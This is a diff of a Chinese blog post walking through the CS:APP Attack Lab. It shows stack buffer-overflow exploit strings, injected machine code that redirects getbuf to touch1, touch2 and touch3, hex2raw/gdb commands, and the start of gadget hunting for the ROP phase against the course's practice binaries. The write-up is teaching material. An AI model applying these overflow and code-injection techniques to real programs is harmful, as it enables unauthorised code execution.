@@ -29,13 +29,22 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454167.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454206.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454272.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454304.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png">
 <meta property="article:published_time" content="2024-02-27T06:51:00.000Z">
 <meta property="article:modified_time" content="2024-02-29T11:08:00.000Z">
 <meta property="article:author" content="zhz_vite">
@@ -260,14 +269,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>17k</span>
+              <span>25k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>31 分钟</span>
+              <span>45 分钟</span>
             </span>
             <div class="post-description">这是一场和计算机的邂逅.</div>
 
@@ -304,7 +313,7 @@
 <p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
 <p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p>
 <p>先输入查看汇编代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt;ctarget.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt;ctarget.s</span><br></pre></td></tr></table></figure>
 
 <p>Getbuf:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
@@ -312,16 +321,16 @@
 <p>Touch1:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
 
-<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
+<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
 <p>即字节码为:(小端法,逆序存储)</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>
 
-<p>保存该文件为p1.txt,然后把这个字节码转化成string,通过hex2raw,然后可以通过-i进行重定向输入,则完成Phase_1</p>
+<p>保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1</p>
 <p>输入命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;p1.txt &gt;p1r.txt</span><br><span class="line">gdb ctarget</span><br><span class="line">run -q -i p1r.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol1.txt &gt;sol1r.txt</span><br><span class="line">gdb ctarget</span><br><span class="line">run -q -i sol1r.txt</span><br></pre></td></tr></table></figure>
 
 <p>观察到以下信息则通关!</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454167.png" alt="image-20240229001752730"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png" alt="image-20240302013522137"></p>
 <h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>照例读一遍官方pdf文档:</p>
 <p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
@@ -332,22 +341,41 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
 
 <p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p>
-<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。</p>
-<p>所以我要注入一段代码,将cookie中的值推送到%edi中,并且通过retq进行连环跳转,我们先写出这段代码,将cookie的值压入rdi中,然后将touch2的地址压入栈顶,最后ret会弹出该栈并且执行touch2</p>
+<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)</p>
+<p>需完成操作:</p>
+<ul>
+<li><p>将cookie(0x59b997fa中的值推送到%rdi中</p>
+</li>
+<li><p>将touch2的地址push到栈中</p>
+</li>
+<li><p>ret,取到touch2的地址</p>
+</li>
+</ul>
+<p>根据以上操作写出汇编代码,保存该代码为t2.s文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 
 <p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454206.png" alt="image-20240229135419686"></p>
-<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令探测到rsp的地址,即栈顶地址</p>
+<p>输入以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og t2.s</span><br><span class="line">objdump -d t2.o&gt;t2.txt</span><br></pre></td></tr></table></figure>
+
+<p>可以得到汇编代码的机器指令:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png" alt="image-20240302014356466"></p>
+<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p>
-<p>p $rsp&#x3D;0x5561dc78</p>
-<p>这样我们就可以开始编我们的进攻序列</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454272.png" alt="image-20240229135914385"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p $rsp=0x5561dc78</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png" alt="image-20240302014950119"></p>
 <p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;t2.txt&gt;t2r.txt</span><br><span class="line">./ctarget -q -i t2r.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol2.txt&gt;sol2r.txt</span><br><span class="line">./ctarget -q -i sol2r.txt</span><br></pre></td></tr></table></figure>
 
 <p>然后提交会得到以下结果,圆满过关!</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454304.png" alt="image-20240229140830699"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png" alt="image-20240302014929043"></p>
+<p>或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png" alt="image-20240302015226085"></p>
+<p>理论成立,实践开始!</p>
+<p>圆满通关!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png" alt="image-20240302015316019"></p>
 <h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>看一下官方文档:</p>
 <p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
 <p>touch3 C &amp;&amp; Assembly Code:</p>
@@ -361,20 +389,44 @@
 <p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p>
 <p>解决问题逻辑如下:</p>
 <p>我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi</p>
-<p>将cookie字符用man ascii命令转换成ascii码,hexmatch和strncmp可能会覆盖getbuf的空间,所以我们要找一个安全的栈空间存放进攻代码,我们知道一开始getbuf分配的栈空间为0x5561dc78-0x5561dca0,*s &#x3D; cbuf + (1~99),</p>
-<p>在呼叫touch3之前我们要把char *sval的值(也就是指sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p>
-<p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中0x5561dca8,所以我们把cookie转换成ascii码是</p>
+<p>在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p>
+<p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.</p>
+<p>操作如下</p>
+<ul>
+<li>把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0–&gt;00</li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 #00是字符串结尾</span><br></pre></td></tr></table></figure>
 
-<p>构建以下命令</p>
+<ul>
+<li>将touch3地址压入栈中</li>
+<li>将%rsp地址+8—&gt;到%rdi中(当然也可以写精确地址0x5561dca8)</li>
+<li>retq</li>
+</ul>
+<p>构建以下命令,保存为t3.s文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
 
-<p>然后用Phase_2的方法得到机器代码</p>
+<p>然后用Phase_2的方法得到机器指令代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og t3.s</span><br><span class="line">objdump -d t3.o&gt;t3.txt</span><br></pre></td></tr></table></figure>
+
+<p>会得到如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t3.o:     file format elf64-x86-64</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   5:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi</span><br><span class="line">   a:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">68 fa 18 40 00 48 8d 7c </span><br><span class="line">24 08 c3 00 00 00 00 00//上面的是机器指令代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00//填充字符</span><br><span class="line">78 dc 61 55 00 00 00 00 //还是跳转到栈顶,需要padding</span><br><span class="line">35 39 62 39 39 37 66 61 //存再test栈帧中的值,0x5561dca0</span><br><span class="line">00 </span><br></pre></td></tr></table></figure>
+
+<p>最后输入以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol3.txt &gt;sol3r.txt &amp;&amp; ./ctarget -q -i sol3r.txt</span><br></pre></td></tr></table></figure>
+
+<p>若看见以下界面,则恭喜通关!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png" alt="image-20240302020227034"></p>
 <h1 id="Part-II-ROP"><a href="#Part-II-ROP" class="headerlink" title="Part II: ROP"></a>Part II: ROP</h1><h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><blockquote>
 <p>ROP: Return-Oriented Programming</p>
 <p>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭</p>
 </blockquote>
-<p>part2的限制:</p>
+<p>得到rtarget的汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget&gt;rtarget.s</span><br></pre></td></tr></table></figure>
+
+<p>Part2的限制:</p>
 <ol>
 <li>恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置</li>
 <li>恢复了栈的区域标记,分为可写,可读,可执行.</li>
@@ -429,6 +481,87 @@
 <li><p>只需要使用两个gadgets</p>
 </li>
 </ul>
+<p>我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令</p>
+<p><strong>一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og farm.c</span><br><span class="line">objdump -d farm.o&gt;farm.s</span><br></pre></td></tr></table></figure>
+
+<p>我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq</p>
+<p>操作顺序:</p>
+<ul>
+<li><p>转移cookie的值转移到%rdi中</p>
+</li>
+<li><p>把$0x4017ec(touch2地址)压入栈中</p>
+</li>
+<li><p>ret</p>
+</li>
+</ul>
+<p>这是相关联的函数,需要在其中找到gadgets</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;start_farm&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">   9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000000a &lt;getval_142&gt;:</span><br><span class="line">   a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  13:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000014 &lt;addval_273&gt;:</span><br><span class="line">  14:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  1e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000001f &lt;addval_219&gt;:</span><br><span class="line">  1f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  29:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000002a &lt;setval_237&gt;:</span><br><span class="line">  2a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  34:	c3                   	retq   </span><br><span 